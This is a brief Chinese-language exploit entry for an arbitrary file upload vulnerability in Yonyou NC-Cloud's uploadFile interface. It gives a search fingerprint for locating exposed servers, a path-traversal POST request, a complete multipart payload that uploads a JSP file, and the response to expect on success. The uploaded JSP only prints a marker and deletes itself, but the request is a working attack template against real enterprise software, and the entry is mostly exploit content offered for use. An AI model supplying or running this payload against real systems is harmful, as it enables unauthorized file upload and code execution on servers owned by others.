# 用友uploadFile接口任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`POST /mp/login/../uploadControl/uploadFile HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="file"; filename="dudesite.jsp"
Content-Type: application/octet-stream
<%out.println("dudesite");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="submit"
submit
------WebKitFormBoundaryoDIsCqVMmF83ptmp--
```
- **响应特征**：200 forbidden